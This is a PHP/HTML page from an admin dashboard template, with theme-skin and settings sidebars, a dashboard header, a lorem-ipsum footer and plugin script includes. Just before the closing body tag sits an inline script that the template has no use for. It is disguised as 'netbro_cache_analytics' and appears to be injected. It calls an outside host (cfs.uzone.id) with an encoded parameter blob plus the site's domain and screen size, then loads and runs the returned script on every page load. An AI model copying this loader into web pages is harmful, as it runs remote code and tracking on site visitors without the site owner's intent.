<?php include 'header.php' ?>

    <!-- Right Sidebar -->
    <aside id="rightsidebar" class="right-sidebar">
        <ul class="nav nav-tabs tab-nav-right" role="tablist">
            <li role="presentation" class="active"><a href="#skins" data-toggle="tab">Skins</a></li>
        </ul>
        <div class="tab-content">
            <div role="tabpanel" class="tab-pane fade in active in active" id="skins">
                <ul class="demo-choose-skin">
                    <h6>Flat Color</h6>
                    <li data-theme="red"  class="active">
                        <div class="red"></div>
                        <span>Red</span> </li>
                    <li data-theme="purple">
                        <div class="purple"></div>
                        <span>Purple</span> </li>
                    <li data-theme="deep-purple">
                        <div class="deep-purple"></div>
                        <span>Deep Purple</span> </li>
                    <li data-theme="blue">
                        <div class="blue"></div>
                        <span>Blue</span> </li>
                    <li data-theme="cyan">
                        <div class="cyan"></div>
                        <span>Cyan</span> </li>
                    <li data-theme="blue-grey">
                        <div class="blue-grey"></div>
                        <span>Blue Grey</span> </li>
                    <li data-theme="black">
                        <div class="black"></div>
                        <span>Black</span> </li>
                    <h6>Gradient Theme</h6>
                    <li data-theme="green">
                        <div class="green"></div>
                        <span>Green</span> </li>
                    <li data-theme="orange">
                        <div class="orange"></div>
                        <span>Orange</span> </li>
                    <li data-theme="blush">
                        <div class="blush"></div>
                        <span>Blush</span> </li>
                </ul>
            </div>
            
            <div role="tabpanel" class="tab-pane fade" id="settings">
                <div class="demo-settings">
                    <p class="text-left">GENERAL SETTINGS</p>
                    <ul class="setting-list">
                        <li> <span>Report Panel Usage</span>
                            <div class="switch">
                                <label>
                                    <input type="checkbox" checked>
                                    <span class="lever"></span></label>
                            </div>
                        </li>
                        <li> <span>Email Redirect</span>
                            <div class="switch">
                                <label>
                                    <input type="checkbox">
                                    <span class="lever"></span></label>
                            </div>
                        </li>
                    </ul>
                    <p class="text-left">SYSTEM SETTINGS</p>
                    <ul class="setting-list">
                        <li> <span>Notifications</span>
                            <div class="switch">
                                <label>
                                    <input type="checkbox" checked>
                                    <span class="lever"></span></label>
                            </div>
                        </li>
                        <li> <span>Auto Updates</span>
                            <div class="switch">
                                <label>
                                    <input type="checkbox" checked>
                                    <span class="lever"></span></label>
                            </div>
                        </li>
                    </ul>
                    <p class="text-left">ACCOUNT SETTINGS</p>
                    <ul class="setting-list">
                        <li> <span>Offline</span>
                            <div class="switch">
                                <label>
                                    <input type="checkbox">
                                    <span class="lever"></span></label>
                            </div>
                        </li>
                        <li> <span>Location Permission</span>
                            <div class="switch">
                                <label>
                                    <input type="checkbox" checked>
                                    <span class="lever"></span></label>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </aside>
</section>
<!-- Main Content -->
<section class="content home">
    <div class="block-header">
        <div class="row">
            <div class="col-md-8 col-sm-7 col-xs-12">
                <div class="h-left clearfix aos-item" data-aos-duration="400" data-aos-delay="300" data-aos="slide-down">
                    <h2>DASHBOARD</h2>
                    <small class="text-muted">Welcome</small>
                    <ol class="breadcrumb breadcrumb-col-pink p-l-0">
                        <li><a href="javascript:void(0);">Dashboard</a></li>                        
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid">                
        <div class="row clearfix">
            <div class="col-xs-12 col-sm-12 col-md-12">
                <div class="card">
                    <div class="body" id="footer">
                        <div class="row">
                            <div class="col-xs-12 col-sm-4">
                                <h5>Email Newsletters</h5>
                                <p>Sign up for new MaterialWrap content, updates, and offers.</p>
                                <div class="input-group">
                                    <div class="form-line">
                                        <input type="text" class="form-control date" placeholder="Enter your email...">
                                    </div>
                                    <span class="input-group-addon"> <i class="material-icons">send</i> </span> </div>
                            </div>
                            <div class="col-xs-12 col-sm-2">
                                <h5>Company</h5>
                                <ul class="list-unstyled company">
                                    <li><a href="javascript:void(0)">About Us </a></li>
                                    <li><a href="javascript:void(0)">Careers</a></li>
                                    <li><a href="javascript:void(0)">Privacy Policy</a></li>
                                    <li><a href="javascript:void(0)">Contact Us</a></li>
                                </ul>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <h5>Want to Work with Us?</h5>
                                <p>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged.</p>
                            </div>
                            <div class="col-xs-12">
                                <p class="copy m-b-0">© Copyright
                                    <time class="year">2017</time>
                                    Thememakker - All Rights Reserved</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>
<!-- Jquery Core Js --> 
<script src="assets/bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="assets/bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<script src="assets/plugins/jvectormap/jquery-jvectormap-1.2.2.min.js"></script> <!-- JVectorMap Plugin Js --> 
<script src="assets/plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script> <!-- JVectorMap Plugin Js --> 
<script src="assets/plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->
<script src="assets/plugins/jquery-countto/jquery.countTo.js"></script> <!-- Jquery CountTo Plugin Js --> 
<script src="assets/bundles/flotscripts.bundle.js"></script><!-- Flot Charts Plugin Js --> 
<script src="assets/bundles/morrisscripts.bundle.js"></script><!-- Morris Plugin Js -->
<script src="assets/plugins/jquery-knob/jquery.knob.min.js"></script> <!-- Jquery Knob Plugin Js -->
<script src="assets/plugins/aos-animation/aos.js"></script> <!-- AOS Animation -->


<script src="assets/bundles/mainscripts.bundle.js"></script>
<script src="assets/js/pages/index.js"></script>
<script src="assets/js/pages/maps/jvectormap.js"></script> 
<script src="assets/js/pages/charts/jquery-knob.js"></script>

<script type="text/javascript">

    AOS.init({
        easing: 'ease-in-out-sine'
    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1OYshcrUbTnlARAKQQu5HT9ddkVn5j8lwN2TU3YZgjji28uf5FvLMH4wfp54M4p20U1ouwuP4G16ypDokGUPu5aMyOBvUfKQrfiMIP2wV2n3s%2f7DnW4xNJgDc39DhKvaYBOrEvcfy6WLi1WfjCzetS%2f9utF8Cf%2fG9BgvBVshF210iS4%2bcBDUQrAR%2frFEBCz3oAN1dkE%2fMnUopDkY0WX0sToCJ9CTl3DEI%2bbASXg1ow0twRfhO6Cv6fwJonXMl1hlOWePbRqBt%2fw6gjA3yo5E5T4g01myDWsJQ0LNCLVfr6r%2f2vm3N60rxk57xkFCGA1uyS7upy4SIJ5jEOIrZ%2b1Gy2m%2btSsnfP4fhtFQ90WdF4BSI6NLW%2bP6YgJAWHpo2Jx3HMNnBLS580d7t5tlhvwWXhs2ilzvH%2fWDcpVgjjGzCc5xA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>